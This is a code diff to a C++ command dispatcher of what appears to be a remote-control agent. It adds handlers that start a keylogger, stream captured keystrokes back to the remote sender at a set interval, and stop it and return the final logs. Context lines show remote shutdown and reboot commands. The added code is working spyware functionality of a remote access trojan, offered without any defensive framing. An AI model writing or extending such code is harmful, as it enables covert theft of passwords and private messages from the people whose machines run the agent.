@@ -1,5 +1,8 @@
 #include "CommandDispatcher.hpp"
 
+static Keylogger g_keylogger;
+static std::atomic<bool> g_isKeylogging(false);
+
 CommandDispatcher::CommandDispatcher() {
     registerHandlers();
 }
@@ -29,7 +32,7 @@ void CommandDispatcher::dispatch(const Message& msg, ResponseCallBack cb) {
             );
         }
     } else {
-        if (msg.type != Protocol::TYPE::AUTH) {
+        if (msg.type != Protocol::TYPE::AUTH && msg.type != Protocol::TYPE::ERROR) {
             cout << "[Dispatcher] Unknown command: " << msg.type << "\n";
             cb(
                 Message(
@@ -282,6 +285,66 @@ void CommandDispatcher::registerHandlers() {
             }
         }).detach();
     };
+
+    routes_[Protocol::TYPE::START_KEYLOG] = [](const Message& msg, ResponseCallBack cb) {
+        if (g_isKeylogging) {
+            cb(Message(Protocol::TYPE::ERROR, {{"msg", "Keylogger is already running"}}, "", msg.from));
+            return;
+        }
+
+        g_isKeylogging = true;
+        g_keylogger.Start();
+
+        cb(Message(Protocol::TYPE::START_KEYLOG, {{"status", "ok"}, {"msg", "Keylogger started (Streaming mode)"}}, "", msg.from));
+
+        std::thread([msg, cb]() {
+            int intervalMs = 500; 
+            
+            try {
+                std::string args = msg.getDataString();
+                if (!args.empty()) {
+                    auto j = json::parse(args, nullptr, false);
+                    if (!j.is_discarded() && j.contains("interval")) {
+                        intervalMs = static_cast<int>(j["interval"].get<float>() * 1000);
+                    }
+                }
+            } catch(...) {}
+            if (intervalMs < 100) intervalMs = 100;
+
+            while (g_isKeylogging) {
+                std::this_thread::sleep_for(std::chrono::milliseconds(intervalMs));
+                
+                std::string currentKeys = Keylogger::getDataAndClear();
+                if (!currentKeys.empty()) {
+                    cb(Message(Protocol::TYPE::STREAM_DATA, 
+                        {
+                            {"status", "ok"},
+                            {"mime", "keylog"},
+                            {"data", currentKeys}
+                        }, "", msg.from));
+                }
+            }
+        }).detach();
+    };
+
+    routes_[Protocol::TYPE::STOP_KEYLOG] = [](const Message& msg, ResponseCallBack cb) {
+        if (!g_isKeylogging) {
+            cb(Message(Protocol::TYPE::ERROR, {{"msg", "Keylogger is not running"}}, "", msg.from));
+            return;
+        }
+
+        g_isKeylogging = false; 
+        g_keylogger.Stop();   
+        
+        std::string finalLogs = Keylogger::getDataAndClear();
+        
+        cb(Message(Protocol::TYPE::STOP_KEYLOG, 
+            {
+                {"status", "ok"}, 
+                {"msg", "Keylogger stopped"},
+                {"data", finalLogs}
+            }, "", msg.from));
+    };
     
     routes_[Protocol::TYPE::SHUTDOWN] = [](const Message& msg, ResponseCallBack cb) {
         cb(Message(
@@ -329,5 +392,13 @@ void CommandDispatcher::registerHandlers() {
                 system("systemctl reboot");
             #endif
         }).detach();
+    };
+    
+    routes_[Protocol::TYPE::ECHO] = [](const Message& msg, ResponseCallBack cb) {
+         cb(Message(Protocol::TYPE::ECHO, "Agent Echo: " + msg.getDataString(), "", msg.from));
+    };
+    
+    routes_[Protocol::TYPE::WHOAMI] = [](const Message& msg, ResponseCallBack cb) {
+         cb(Message(Protocol::TYPE::WHOAMI, getHostName(), "", msg.from));
     };
 }
